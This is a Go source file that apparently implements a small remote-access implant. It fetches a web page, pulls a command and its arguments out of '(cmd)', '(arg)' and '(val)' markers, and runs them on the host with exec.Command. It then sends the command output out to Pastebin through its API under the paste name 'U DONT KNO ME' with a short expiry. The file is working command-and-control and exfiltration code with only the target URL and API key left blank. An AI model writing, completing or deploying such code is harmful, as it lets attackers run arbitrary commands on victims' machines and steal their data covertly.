package main

import(
    "net/http"
    "log"
    "net/url"
    "io/ioutil"
    "regexp"
    "fmt"
    "strings"
    "os/exec"
    "html"
    "bytes"
)

func main(){

    GetCmd()

}


func GetCmd(){
    url := ""
    resp, err := http.Get(url)
    if err != nil {
        log.Fatalln(err)
    }

    body, err := ioutil.ReadAll(resp.Body)

    if err != nil {
        log.Fatalln(err)
    }
    re := regexp.MustCompile("\\(cmd\\).*?\\(cmd\\)")
    cmdParsed := re.FindStringSubmatch(string(body))
    cmd := strings.Join(cmdParsed, " ")
    cmd = strings.ReplaceAll(cmd, "(cmd)", "")

    re = regexp.MustCompile("\\(arg\\).*?\\(arg\\)")
    argParsed := re.FindStringSubmatch(string(body))
    arg := strings.Join(argParsed, " ")
    arg = strings.ReplaceAll(arg, "(arg)", "")
    arg = html.UnescapeString(arg)

    re = regexp.MustCompile("\\(val\\).*?\\(val\\)")
    valParsed := re.FindStringSubmatch(string(body))
    val := strings.Join(valParsed, " ")
    val = strings.ReplaceAll(val, "(val)", "")
    val = html.UnescapeString(val)

    fmt.Println("Command is: " + cmd + " " + arg + " " + val)

    var out []byte

    if cmd != "" && arg != "" && val != "" {
        out, err = exec.Command(cmd, arg, val).Output()
    } else if cmd != "" && arg != "" {
        out, err = exec.Command(cmd, arg).Output()
    } else if cmd != "" && val != ""{
        out, err = exec.Command(cmd, val).Output()
    } else {
        out, err = exec.Command(cmd).Output()
    }

    if err != nil {
        log.Fatalln(err)
    }
    SendResponse(string(out))
}

func SendResponse(output string){
    values := url.Values{}
	values.Set("api_dev_key", "")
	values.Set("api_option", "paste")
	values.Set("api_paste_code", output)
	values.Set("api_paste_name", "U DONT KNO ME")
	values.Set("api_paste_expire_date", "10M")
	response, err := http.PostForm("http://pastebin.com/api/api_post.php", values)
	defer response.Body.Close()
	if err != nil {
        log.Fatalln(err)
	}
	if response.StatusCode != 200 {
        log.Fatalln(response.StatusCode)
	}
	buf := bytes.Buffer{}
	_, err = buf.ReadFrom(response.Body)
	if err != nil {
		log.Fatalln(err)
	}
    fmt.Println(buf.String())
}
